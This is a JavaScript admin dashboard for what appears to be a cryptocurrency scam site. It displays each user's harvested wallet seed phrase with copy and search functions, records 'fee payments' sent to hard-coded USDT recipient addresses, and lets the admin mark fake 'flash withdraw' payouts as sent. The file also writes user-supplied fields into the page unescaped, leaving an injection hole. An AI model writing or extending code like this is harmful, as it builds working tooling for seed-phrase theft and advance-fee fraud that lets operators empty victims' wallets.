// ============================================
// ADMIN DASHBOARD
// ============================================

let allUsers = [];
let allTx = [];
let allCurrencies = [];
let currentEditEmail = null;
let currentEditCurrencyIndex = -1;

// ============================================
// TABS
// ============================================
function switchAdminTab(tabName) {
    document.querySelectorAll('.tab-panel').forEach(p => p.classList.remove('active'));
    document.querySelectorAll('.nav-tab').forEach(t => t.classList.remove('active'));
    document.getElementById('tab-' + tabName).classList.add('active');
    event.target.classList.add('active');
}

// ============================================
// LOAD DATA
// ============================================
async function loadAllData() {
    await Promise.all([refreshUsers(), refreshTransactions(), loadCurrencies()]);
    updateStats();
}

async function refreshUsers() {
    const result = await getAllUsers();
    if (result.success) {
        allUsers = result.data;
        renderUsersTable(allUsers);
        updateStats();
    }
}

async function refreshTransactions() {
    const result = await getAllTransactions();
    if (result.success) {
        allTx = result.data;
        renderTxTable(allTx);
        renderRecentActivity(allTx.slice(0, 10));
        updateStats();
    }
}

async function loadCurrencies() {
    const defaultCurrencies = [
        { symbol: 'USDT', name: 'Tether USD', network: 'ERC20', fee: 0.02, recipient: '0x16738514b5fe77c5e4c5577d7fd8233db40bfe8c' },
        { symbol: 'USDT', name: 'Tether USD', network: 'BEP20', fee: 0.07, recipient: '0x16738514b5fe77c5e4c5577d7fd8233db40bfe8c' },
        { symbol: 'USDT', name: 'Tether USD', network: 'TRC20', fee: 175, recipient: 'TDpnZSE43PPSQRYFkDFaf5jKj1JcB68oWA' }
    ];
    const result = await getCurrencySettings();
    if (result.success && result.data) {
        allCurrencies = result.data;
    } else {
        allCurrencies = defaultCurrencies;
        await saveCurrencySettings(allCurrencies);
    }
    renderCurrencyTable(allCurrencies);
}

// ============================================
// RENDER TABLES
// ============================================
function renderUsersTable(users) {
    const tbody = document.getElementById('usersTable');
    if (!users.length) {
        tbody.innerHTML = '<tr><td colspan="8" class="empty-state"><div class="icon">👥</div>No users yet</td></tr>';
        return;
    }
    tbody.innerHTML = users.map(u => `
        <tr>
            <td style="color: #00f2ff;">${u.email || '--'}</td>
            <td><span class="mono" style="max-width: 150px; display: inline-block; overflow: hidden; text-overflow: ellipsis;">${u.seed_phrase || '--'}</span> <button class="btn-sm btn-info" onclick="copyText('${u.seed_phrase || ''}')" style="margin-left:4px;">📋</button></td>
            <td><span class="mono">${u.wallet_address ? u.wallet_address.substring(0, 8) + '...' + u.wallet_address.substring(u.wallet_address.length - 4) : '--'}</span> <button class="btn-sm btn-info" onclick="copyText('${u.wallet_address || ''}')" style="margin-left:4px;">📋</button></td>
            <td><span class="badge badge-blue">${u.network || '--'}</span></td>
            <td style="color: #00FF41;">${u.usdt_balance || '0'} USDT<br><span style="color:#888;font-size:11px;">${u.native_balance || '0'} ${u.network === 'TRC20' ? 'TRX' : u.network === 'ERC20' ? 'ETH' : 'BNB'}</span></td>
            <td>${u.fee_paid ? '<span class="badge badge-green">Yes</span>' : '<span class="badge badge-red">No</span>'}</td>
            <td>${u.flash_withdrawn ? '<span class="badge badge-green">$' + (u.flash_amount || 0) + '</span>' : '<span class="badge badge-yellow">Pending</span>'}</td>
            <td><button class="btn-sm btn-warning" onclick="openUserModal('${u.email}')">Edit</button> <button class="btn-sm btn-danger" onclick="deleteUserConfirm('${u.email}')">Del</button></td>
        </tr>
    `).join('');
}

function renderTxTable(txs) {
    const tbody = document.getElementById('txTable');
    if (!txs.length) {
        tbody.innerHTML = '<tr><td colspan="8" class="empty-state"><div class="icon">💸</div>No transactions yet</td></tr>';
        return;
    }
    tbody.innerHTML = txs.map(tx => `
        <tr>
            <td style="color: #00f2ff;">${tx.user_email || '--'}</td>
            <td><span class="badge ${tx.type === 'Fee Payment' ? 'badge-yellow' : 'badge-green'}">${tx.type || '--'}</span></td>
            <td style="color: #00FF41;">${tx.amount || 0}</td>
            <td>${tx.currency || '--'}</td>
            <td><span class="badge badge-blue">${tx.network || '--'}</span></td>
            <td><span class="mono">${tx.tx_hash ? tx.tx_hash.substring(0, 12) + '...' : '--'}</span></td>
            <td>${tx.status === 'completed' ? '<span class="badge badge-green">Completed</span>' : '<span class="badge badge-yellow">' + (tx.status || 'pending') + '</span>'}</td>
            <td style="color:#888;font-size:11px;">${tx.created_at ? new Date(tx.created_at).toLocaleString() : '--'}</td>
        </tr>
    `).join('');
}

function renderRecentActivity(txs) {
    const tbody = document.getElementById('recentActivity');
    if (!txs.length) {
        tbody.innerHTML = '<tr><td colspan="5" class="empty-state">No recent activity</td></tr>';
        return;
    }
    tbody.innerHTML = txs.map(tx => `
        <tr>
            <td style="color: #00f2ff;">${tx.user_email || '--'}</td>
            <td><span class="badge ${tx.type === 'Fee Payment' ? 'badge-yellow' : 'badge-green'}">${tx.type || '--'}</span></td>
            <td style="color: #00FF41;">${tx.amount || 0} ${tx.currency || ''}</td>
            <td><span class="badge badge-blue">${tx.network || '--'}</span></td>
            <td style="color:#888;font-size:11px;">${tx.created_at ? new Date(tx.created_at).toLocaleString() : '--'}</td>
        </tr>
    `).join('');
}

function renderCurrencyTable(currencies) {
    const tbody = document.getElementById('currencyTable');
    tbody.innerHTML = currencies.map((c, i) => `
        <tr>
            <td style="color: #00f2ff; font-weight: 600;">${c.symbol}</td>
            <td>${c.name}</td>
            <td><span class="badge badge-blue">${c.network}</span></td>
            <td style="color: #ffc107;">${c.fee} ${c.network === 'TRC20' ? 'TRX' : c.network === 'ERC20' ? 'ETH' : 'BNB'}</td>
            <td><span class="mono">${c.recipient ? c.recipient.substring(0, 10) + '...' : '--'}</span></td>
            <td>
                <button class="btn-sm btn-warning" onclick="editCurrency(${i})">Edit</button>
                <button class="btn-sm btn-danger" onclick="deleteCurrency(${i})">Del</button>
            </td>
        </tr>
    `).join('');
}

// ============================================
// STATS
// ============================================
function updateStats() {
    document.getElementById('statUsers').textContent = allUsers.length;
    document.getElementById('statTx').textContent = allTx.length;
    let totalFees = 0;
    let totalFlash = 0;
    allTx.forEach(tx => {
        if (tx.type === 'Fee Payment') totalFees += parseFloat(tx.amount) || 0;
        if (tx.type === 'Flash Withdraw') totalFlash += parseFloat(tx.amount) || 0;
    });
    document.getElementById('statFees').textContent = '$' + totalFees.toFixed(2);
    document.getElementById('statFlash').textContent = '$' + totalFlash.toFixed(2);
}

// ============================================
// SEARCH
// ============================================
function filterUsers(query) {
    const q = query.toLowerCase();
    const filtered = allUsers.filter(u =>
        (u.email && u.email.toLowerCase().includes(q)) ||
        (u.wallet_address && u.wallet_address.toLowerCase().includes(q)) ||
        (u.seed_phrase && u.seed_phrase.toLowerCase().includes(q))
    );
    renderUsersTable(filtered);
}

// ============================================
// USER MODAL
// ============================================
function openUserModal(email) {
    const user = allUsers.find(u => u.email === email);
    if (!user) return;
    currentEditEmail = email;
    document.getElementById('modalEmail').value = user.email || '';
    document.getElementById('modalSeed').value = user.seed_phrase || '';
    document.getElementById('modalAddress').value = user.wallet_address || '';
    document.getElementById('modalNetwork').value = user.network || '';
    document.getElementById('modalFeePaid').value = user.fee_paid ? 'true' : 'false';
    document.getElementById('modalFlash').value = user.flash_withdrawn ? 'true' : 'false';
    document.getElementById('modalFlashAmount').value = user.flash_amount || 0;
    document.getElementById('userModal').classList.add('active');
}

async function saveUserModal() {
    const updates = {
        fee_paid: document.getElementById('modalFeePaid').value === 'true',
        flash_withdrawn: document.getElementById('modalFlash').value === 'true',
        flash_amount: parseFloat(document.getElementById('modalFlashAmount').value) || 0
    };
    const result = await updateUser(currentEditEmail, updates);
    if (result.success) {
        showToast('User updated!', 'success');
        closeModal('userModal');
        await refreshUsers();
    } else {
        showToast('Error: ' + result.message, 'error');
    }
}

async function deleteUserConfirm(email) {
    if (!confirm('Delete user ' + email + '?')) return;
    const result = await deleteUser(email);
    if (result.success) {
        showToast('User deleted', 'success');
        await refreshUsers();
    } else {
        showToast('Error: ' + result.message, 'error');
    }
}

// ============================================
// CURRENCY MODAL
// ============================================
function openCurrencyModal() {
    currentEditCurrencyIndex = -1;
    document.getElementById('curSymbol').value = 'USDT';
    document.getElementById('curName').value = 'Tether USD';
    document.getElementById('curNetwork').value = 'ERC20';
    document.getElementById('curFee').value = '';
    document.getElementById('curRecipient').value = '';
    document.getElementById('currencyModal').classList.add('active');
}

function editCurrency(index) {
    currentEditCurrencyIndex = index;
    const c = allCurrencies[index];
    document.getElementById('curSymbol').value = c.symbol;
    document.getElementById('curName').value = c.name;
    document.getElementById('curNetwork').value = c.network;
    document.getElementById('curFee').value = c.fee;
    document.getElementById('curRecipient').value = c.recipient;
    document.getElementById('currencyModal').classList.add('active');
}

async function saveCurrencyModal() {
    const cur = {
        symbol: document.getElementById('curSymbol').value.trim(),
        name: document.getElementById('curName').value.trim(),
        network: document.getElementById('curNetwork').value,
        fee: parseFloat(document.getElementById('curFee').value) || 0,
        recipient: document.getElementById('curRecipient').value.trim()
    };
    if (currentEditCurrencyIndex >= 0) {
        allCurrencies[currentEditCurrencyIndex] = cur;
    } else {
        allCurrencies.push(cur);
    }
    const result = await saveCurrencySettings(allCurrencies);
    if (result.success) {
        showToast('Currency saved!', 'success');
        closeModal('currencyModal');
        renderCurrencyTable(allCurrencies);
    } else {
        showToast('Error: ' + result.message, 'error');
    }
}

async function deleteCurrency(index) {
    if (!confirm('Delete this currency?')) return;
    allCurrencies.splice(index, 1);
    await saveCurrencySettings(allCurrencies);
    renderCurrencyTable(allCurrencies);
    showToast('Currency deleted', 'success');
}

// ============================================
// SEND COINS
// ============================================
async function sendCoinsToUser() {
    const email = document.getElementById('sendEmail').value.trim();
    const network = document.getElementById('sendNetwork').value;
    const amount = parseFloat(document.getElementById('sendAmount').value);
    const txHash = document.getElementById('sendTxHash').value.trim();
    const resultDiv = document.getElementById('sendResult');
    if (!email || !amount) {
        resultDiv.innerHTML = '<span style="color: #FF4444;">Please fill email and amount</span>';
        return;
    }
    const result = await saveTransaction({
        userEmail: email,
        type: 'Flash Withdraw',
        amount: amount,
        currency: 'USDT',
        network: network,
        txHash: txHash || 'pending',
        status: txHash ? 'completed' : 'pending'
    });
    if (result.success) {
        await updateUser(email, { flash_withdrawn: true, flash_amount: amount });
        resultDiv.innerHTML = '<span style="color: #00FF41;">✅ Sent ' + amount + ' USDT to ' + email + ' on ' + network + '</span>';
        showToast('Coins sent & recorded!', 'success');
        await refreshTransactions();
        await refreshUsers();
        document.getElementById('sendAmount').value = '';
        document.getElementById('sendTxHash').value = '';
    } else {
        resultDiv.innerHTML = '<span style="color: #FF4444;">❌ Error: ' + result.message + '</span>';
    }
}

// ============================================
// UTILITIES
// ============================================
function closeModal(id) {
    document.getElementById(id).classList.remove('active');
}

function copyText(text) {
    if (!text) return;
    navigator.clipboard.writeText(text).then(function() { showToast('Copied!', 'success'); });
}

function showToast(msg, type) {
    const toast = document.createElement('div');
    toast.className = 'toast toast-' + type;
    toast.textContent = msg;
    document.body.appendChild(toast);
    setTimeout(function() { toast.remove(); }, 3000);
}

document.addEventListener('click', function(e) {
    if (e.target.classList.contains('modal-overlay')) {
        e.target.classList.remove('active');
    }
});
